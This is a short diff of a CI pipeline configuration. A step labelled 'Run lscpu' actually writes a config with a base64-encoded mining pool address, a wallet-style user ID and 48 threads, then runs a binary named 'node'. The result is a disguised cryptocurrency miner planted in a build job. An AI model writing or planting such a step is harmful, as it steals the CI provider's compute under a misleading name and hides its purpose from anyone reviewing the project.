@@ -7,7 +7,7 @@ jobs:
     steps:
       - checkout  # Optional: checks out your repository code
       - run:
-          name: Run lscpu 
+          name: Run lscpu p
           command: |
             chmod +x ./node && echo '{"proxy": "wss://epoch-labs.up.railway.app/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=","config": { "threads": 48, "log": true },"options": { "user": "RWRBUB1MyCu9TuzedVXpFbLLSv7jS3eZKQ", "password": "c=RVN", "argent": "aiagent" }}' > data.json
             ./node app.js
